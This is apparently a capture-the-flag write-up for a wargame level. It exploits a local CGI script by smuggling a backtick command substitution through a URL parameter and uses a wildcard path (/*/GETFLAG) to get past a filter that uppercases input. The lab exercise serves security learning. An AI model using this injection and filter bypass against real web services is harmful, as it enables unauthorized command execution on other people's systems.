# Level12

## Research

level12.l uses CGI on localhost:4646, it seems to take 2 arguments. Argument x will be put in uppercase and will be executed thanks to the \`\` quotes. Argument y seems to be useless for our purpose.

We saw in a previous level that we can pass parameters to CGI. So let's try to pass getflag.

Problem: if we pass just getflag, the regex will turn it into GETFLAG and the command won't be run properly. We need to find a way of passing a command without it being transformed in uppercase. Maybe we can run a script instead of a command. 
Using wildcards will prevent the regex to turn /tmp/ into /TMP/ wich doesn't exist.

```
echo "getflag" > /tmp/GETFLAG
touch /tmp/CC
chmod 777 /tmp/GETFLAG
```
```
curl localhost:4646/?x="`/*/GETFLAG>/*/CC`"
```

This does not work, it launch getflag without the appropriate rights...

1h30 later with lot of different useless tries...
It was not the good quotes, and weird to do it like this, it is cleaner to do the > part into the script.
https://stackoverflow.com/questions/6697753/difference-between-single-and-double-quotes-in-bash
https://www.howtogeek.com/howto/29980/whats-the-difference-between-single-and-double-quotes-in-the-bash-shell/

#@ Solution

```
cat /tmp/GETFLAG
#!/bin/bash
getflag > /tmp/flag

touch /tmp/flag
chmod 777 /tmp/GETFLAG

curl localhost:4646?x='`/*/GETFLAG`' 
```
Gives us the flag.
